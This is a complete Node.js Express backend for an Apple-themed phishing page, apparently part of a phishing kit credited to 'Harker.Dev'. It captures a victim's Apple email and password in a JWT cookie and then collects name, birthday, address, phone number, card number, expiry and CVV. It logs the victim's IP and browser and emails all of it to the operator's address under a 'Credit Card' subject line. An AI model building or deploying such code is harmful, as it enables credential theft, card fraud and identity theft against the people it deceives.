let myemail = 'someemailaddress@yourdomain.tld';

const express = require('express')
const bodyParser = require('body-parser')
const jwt = require('jsonwebtoken')
const cookieParser = require("cookie-parser");
const sendmail = require('sendmail')()
const app = express()
app.use(cookieParser());
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({extended: true}))
app.use(express.static("public"));
app.get("/", (req, res) => {
    res.sendFile(__dirname + "/views/index.html");
  });
  app.get('/update_info', (req, res) => {
    res.sendFile(__dirname + "/views/update.html")
  })
  app.post('/', (req, res) => {
      if(!req.body.email || !req.body.password) return res.sendFile(__dirname + "/views/update.html")
      let token = jwt.sign(req.body, 'signingintokenthatyounok', {expiresIn: '3600s'})
       res.cookie('bearer', token, { maxAge: 900000, httpOnly: true });
      res.sendFile(__dirname + "/views/suspended.html");
  })
  app.post('/update', (req, res) => {
      //5399835018388789
      let token = req.cookies.bearer;
      if(!token) return res.sendFile(__dirname + "/views/index.html");
      let {email, password} = jwt.verify(token, 'signingintokenthatyounok')
      const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
      const userAgent = req.headers['user-agent'];
      let {Name, Month, Day, Year, Address, City, ZipCode, PhoneNumber, Country, card_number, Month_, Year_, CVV } = req.body
      let html = `
        <html>
            <body>
                <p>============= Apple-2 ==============</p>
                <p>Email : ${email}</p>
                <p>Password : ${password}</p>
                <p>Name : ${Name}</p>
                <p>Birthday Info |  Month : ${Month} / Day : ${Day} / Year : ${Year}</p>
                <p>Address : ${Address}</p>
                <p>City : ${City}</p>
                <p>ZipCode : ${ZipCode}</p>
                <p>PhoneNumber : ${PhoneNumber}</p>
                <p>Country : ${Country}</p>
                <p>========== Credit Card Info ==========</p>
                <p>Card Number : ${card_number}</p>
                <p>Month_ : ${Month_}</p>
                <p>Year_: ${Year_}</p>
                <p>CVV : ${CVV}</p>
                <p>============ IP Tracing ===============</p>
                <p>IP : ${ip}</p>
                <p>Browser : ${userAgent}</p>
                <p>Date : ${new Date().toLocaleDateString('en')}</p>
                <p>======= Courtesy of Harker.Dev ===========</p>
            </body>
        </html>
      `;
      sendmail({from: myemail, to: myemail, replyTo: myemail, subject: `Credit Card | ${ip}`, html, headers: {from: 'From: Apple.Info'}}, (err, response) => {
          console.log(err)
          console.log(response)
      })
      res.sendFile(__dirname + "/views/verification.html");
  })
const listener = app.listen(3000, () => console.log('App listening on port 3000'))
